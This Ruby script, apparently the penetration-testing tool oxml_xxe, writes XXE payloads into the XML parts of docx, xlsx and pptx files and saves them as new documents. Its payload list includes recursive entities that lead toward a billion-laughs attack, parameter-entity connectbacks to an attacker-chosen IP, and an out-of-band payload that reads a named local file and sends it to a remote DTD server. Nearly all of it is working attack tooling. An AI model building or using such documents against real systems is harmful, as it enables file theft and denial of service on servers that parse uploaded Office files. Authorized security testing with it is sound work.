# encoding: ASCII-8BIT
require 'zipruby'
require 'highline/import'
require 'highline'
require 'fileutils'
require 'optparse'
require 'json'

# import config @options
@options = JSON.parse(File.read('./options.json'))

OptionParser.new do |opts|
	opts.banner = "Usage: oxml_xxe.rb [options]; \n\t-b or -s are required\n\n"

	opts.on("-b", "--build", "Build XE Document") do |v|
		@options["build"] = true
	end
	opts.on("-s", "--string", "String replace XE Document") do |v|
		@options["string"] = true
	end

	opts.on("-fFILE", "--file=FILE", "docx/xlsx/pptx file to embed the string into") do |v|
		@options["file"] = v
	end
	opts.on("-iIP", "--ip=IP", "Set connect back IP") do |v|
		@options["ip"] = v
	end
	opts.on("-x", "--exfiltrate=EFILE", "The file to exfiltrate") do |v|
		@options["exfiltrate"] = v
	end	
	opts.on("-p", "--print-payloads", "Print the available payloads") do |v|
		@options["payload_list"] = true
	end
	opts.on('-h', '--help', 'Displays Help') do
		puts opts
		exit
	end
end.parse!

if (@options["build"]==false and @options["string"]==false and @options["payload_list"]==false)
	puts "\n Usage: oxml_xxe.rb [options]; \n\t-b or -s are required; -h for help\n\n"
	exit
end

# Keep the payloads organized
def read_payloads()	
	pl = {}
	pl["vanilla_entity"] = ['<!DOCTYPE root [<!ENTITY xxe "XE_SUCCESSFUL">]>', "A simple XML entity."]
	pl["vanilla_recursive"] = ['<!DOCTYPE root [<!ENTITY b "XE_SUCCESSFUL"><!ENTITY xxe "RECURSE &b;&b;&b;&b;">]>', "A recursive XML entity, precursor to billion laughs attack."]	
	pl["vanilla_parameter"] = ['<!DOCTYPE root [<!ENTITY % xxe "test"> %xxe;]>>', "A simple parameter entity. This is useful to test if parameter entities are filtered."]
	pl["vanilla_parameter_recursive"] = ['<!DOCTYPE root [<!ENTITY % a "PARAMETER"> <!ENTITY % b "RECURSIVE %a;"> %b;]>>', "Recursive parameter entity, precusor to parameter entity billion laughs"]
	pl["parameter_connectback"] = ['<!DOCTYPE root [<!ENTITY % a SYSTEM "http://IP/b.dtd">%a;]>>', "Parameter Entity Connectback, the simplest connect back test."]
	pl["dbl_parameter_connectback"] = ['<!DOCTYPE root [<!ENTITY % file SYSTEM "http://IP:PORT/a.html"><!ENTITY % a SYSTEM "http://IP/b.dtd">%a;]>>',"This implements an effective OOB technique. It needs to be paired with a vaid DTD on the server."]
	pl["rc_parameter_connectback"] = ['<!DOCTYPE root [<!ENTITY % file SYSTEM "file://FILE"><!ENTITY % a SYSTEM "http://IP/b.dtd">%a;]>>',"The same OOB technique but retrieves a file. Again needs to be paired with a valid DTD on the server."]
	pl["parameter_connectback_ftp"] = ['<!DOCTYPE root [<!ENTITY % a SYSTEM "ftp://IP/b.dtd">%a;]>>',"FTP connectback test."]
	pl["xinclude_root"] = ['<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///IP/clown.html" parse="text"/></root>', "XInclude test"]
	pl["public_document_def"] = ['<!DOCTYPE roottag PUBLIC "-//OXML//XXE//EN" "http://IP/clown?check">', "Some XML Parser will auto retrieve PUBLIC urls"]

	return pl
end

# print the current payloads and exit
if @options["payload_list"]
	puts "PAYLOAD LIST"
	read_payloads.each do |pload|
		puts "#{pload[0]}: #{pload[1][1]} \n\t #{pload[1][0]}"
	end
	exit
end

# This method retrieves the payloads and allows the user to assign a payload
#	that will be used in the document. 
def select_payload
	ploads = read_payloads()
	payload = ""
	choose do |menu|
		menu.prompt = "Choose XXE payload:"	
		menu.choice "Print XXE Payload Values" do 
			i = 0
			ploads.each do |pload|
				i = i +1
				puts "#{i}. #{pload[1][1]} \n\t #{pload[1][0]}"				
			end			
			exit
		end
		ploads.each do |pload|
			menu.choice pload[0] do payload = pload[1][0] end
		end		
	end
	if payload =~ /IP/ and @options["ip"].size == 0
		@options["ip"] = ask("Payload Requires a connect back IP:")
		payload = payload.gsub("IP",@options["ip"])	
	end
	if payload =~ /FILE/ and @options["exfiltrate"].size == 0
		@options["exfiltrate"] = ask("Payload Requires a file to check for:")	
		payload = payload.gsub("FILE",@options["exfiltrate"])	
	end
	if payload =~ /PORT/ and @options["port"].size == 0
		@options["port"] = ask("Payload allows for connect back port to be specified:")	
		payload = payload.gsub("PORT",@options["port"])	
	end
	
	return payload
end

# Insert the payload into every XML document in the document
def add_payload_all(fz,payload)
	fz.each do |name|
		add_payload(name, payload)
	end		 
end

# The menu for selecting the payload and the XML file to insert into
def choose_file(docx)
	fz = list_files(docx)
	payload = select_payload

	puts "|+| #{payload} selected"
	choose do |menu|
		menu.prompt = "Choose File to insert XXE into:"
		menu.choice "Insert Into All Files Creating Multiple OOXML Files (Recommended)" do add_payload_all(fz, payload) end
		menu.choice "Insert Into All Files In Same OOXML File" do add_payload_all(fz, payload) end
		fz.each do |name|
			menu.choice name do add_payload(name, payload) end
		end		 
	end
end

# takes in a docx and returns a list of files
def list_files(docx)
	files = []
	Zip::Archive.open(docx, Zip::CREATE) do |zipfile|
		n = zipfile.num_files # gather entries
    
		n.times do |i|
			entry_name = zipfile.get_name(i) # get entry name from archive
			files.push(entry_name)
		end
	end
	return files
end

# The meat of the work:
#	reads in the XML file, inserts XXE and then creates the new OXML
def add_payload(name,payloadx)
	document = ""
	# Read in the XLSX and grab the document.xml
	Zip::Archive.open(@options["file"], Zip::CREATE) do |zipfile|
		zipfile.fopen(name) do |f|
			document = f.read # read entry content
		end
	end
	docx_xml = payload(document,payloadx)

	# get file ext
	ext = @options["file"].split(".").last
	nname = "output_#{Time.now.to_i}_#{name.gsub(".","_").gsub("/","_")}"
	rand_file = "./output/#{nname}.#{ext}"

	puts "|+| Creating #{rand_file}"
	FileUtils::copy_file(@options["file"],rand_file)
	Zip::Archive.open(rand_file, Zip::CREATE) do |zipfile|
		zipfile.add_or_replace_buffer(name,
								  docx_xml)
	end
end

# The string replacement functionality
def find_string
	payloadx = select_payload
	
	puts "|+| Checking for § in #{@options["file"]}..."

	targets = []
	Zip::Archive.open(@options["file"], Zip::CREATE) do |zipfile|
		n = zipfile.num_files # gather entries
    
		n.times do |i|
			nm = zipfile.get_name(i)
			zipfile.fopen(nm) do |f|
				document = f.read # read entry content
				if document =~ /§/
					puts "|+| Found § in #{nm}, replacing with &xxe;"
					targets.push(nm)
				end
			end
		end
	end
	
	if targets.size == 0 
		puts "|-| Could not find § in document, please verify."
		return
	end
	
	targets.each do |target|
		document = ""
		# Read in the XLSX and grab the document.xml
		Zip::Archive.open(@options["file"], Zip::CREATE) do |zipfile|
			zipfile.fopen(target) do |f|
				document = f.read # read entry content
			end
		end
		docx_xml = payload(document,payloadx)
		
		# replace string
		docx_xml = docx_xml.gsub("§","&xxe;")

		# get file ext
		ext = @options["file"].split(".").last
		nname = "#{Time.now.to_i}_#{target.gsub(".","_").gsub("/","_")}"
		rand_file = "./output/#{nname}.#{ext}"

		puts "|+| Creating #{rand_file}"
		FileUtils::copy_file(@options["file"],rand_file)
		Zip::Archive.open(rand_file, Zip::CREATE) do |zipfile|
			zipfile.add_or_replace_buffer(target,
									  docx_xml)
		end
	end
end

# this does a simple substitution of the [X]XE into the document DOCTYPE.
#	It also resets the xml from standalone "yes" to "no"
def payload(document,payload)
	# insert the payload, TODO this should be refactored
	document = document.gsub('<?xml version="1.0" encoding="UTF-8"?>',"""<?xml version=\"1.0\" encoding=\"UTF-8\"?>#{payload.gsub('IP',@options["ip"]).gsub('FILE',@options["exfiltrate"])}""")	
	document = document.gsub('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>',"""<?xml version=\"1.0\" encoding=\"UTF-8\"?>#{payload.gsub('IP',@options["ip"]).gsub('FILE',@options["exfiltrate"])}""")
	return document
end

def list_files_menu(string_replace)
	if(@options["file"].size > 0)
		if File.file?(@options["file"])
			puts "|+| Using #{@options["file"]}"
			if string_replace
				find_string
			else
				choose_file(@options["file"])
			end
		end
		exit
	else
		puts "|+| Using #{@options["file"]}"

		# check if file exists
		if File.file?(@options["file"])		
			puts "|+| #{@options["file"]} Loaded\n"
			choose_file(@options["file"])
		else
			puts "|!| #{@options["file"]} cannot be found. Set with -f or modify config.json"
			exit
		end

		if string_replace
			find_string
		end
	end
end

if @options["build"]
	list_files_menu(false)
	exit
end			

if @options["string"]
	list_files_menu(true)
	exit
end			
